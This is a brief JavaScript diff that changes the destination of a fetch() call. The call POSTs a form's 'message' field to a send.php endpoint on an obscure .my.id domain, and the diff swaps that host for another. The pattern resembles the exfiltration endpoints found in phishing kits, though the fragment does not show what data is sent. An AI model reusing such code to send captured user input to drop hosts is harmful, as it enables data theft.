@@ -28,7 +28,7 @@ function next() {
 	var fd = new FormData();
 	fd.append('message', message);
 	
-	fetch("https://bgmwx.my.id/senders/"
+	fetch("https://zxqwx.my.id/senders/"
         +"rjk-ifhkwn/send.php", {
         method: 'POST',
         body: fd
